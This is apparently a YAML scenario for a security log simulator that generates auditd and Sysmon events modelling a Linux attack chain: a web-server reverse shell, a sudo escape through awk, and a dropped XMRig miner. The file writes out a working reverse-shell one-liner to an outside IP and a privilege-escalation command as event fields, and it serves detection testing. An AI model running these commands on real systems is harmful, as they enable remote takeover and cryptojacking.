name: "Linux Vector 2: Web-to-Shell & Cryptominer"
description: "Атака через уязвимость в веб-приложении на сервере. Веб-процесс запускает интерактивную оболочку (Reverse Shell). Затем атакующий повышает привилегии и скачивает скрытый майнер криптовалют."
global_context:
  host.name: "mail01"
  host.domain: "corp.local.uz"
  user.name: "www-data"
steps:
  - id: "l_v2_step1_web_shell"
    template: "linux_auditd_execve"
    description: "Веб-серверный процесс аномально порождает bash-оболочку (имитация эксплуатации RCE / Web Shell)."
    delay_from_prev: "0s"
    fields:
      host_name: "mail01"
      host_ip: "192.168.100.5"
      user_name: "www-data"
      process_name: "/bin/bash"
      parent_path: "/usr/sbin/nginx"
      process_command_line: "bash -i >& /dev/tcp/203.0.113.88/4444 0>&1"
      mitre_technique: "T1505.003"

  - id: "l_v2_step2_privesc_sudo"
    template: "linux_auditd_execve"
    description: "Повышение привилегий через неправильно настроенный sudo (GTFOBins)."
    delay_from_prev: "3m"
    depends_on: "l_v2_step1_web_shell"
    fields:
      host_name: "mail01"
      host_ip: "192.168.100.5"
      user_name: "www-data"
      process_name: "/usr/bin/sudo"
      parent_path: "/bin/bash"
      process_command_line: "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
      mitre_technique: "T1548.003"

  - id: "l_v2_step3_miner_drop"
    template: "sysmon_event_11"
    description: "Скачивание и создание файла майнера XMRig в системной директории."
    delay_from_prev: "1m"
    depends_on: "l_v2_step2_privesc_sudo"
    fields:
      host_name: "mail01"
      host_ip: "192.168.100.5"
      user_name: "root"
      process_name: "/usr/bin/wget"
      file_path: "/tmp/.X11-unix/xmrig"
      mitre_technique: "T1496"
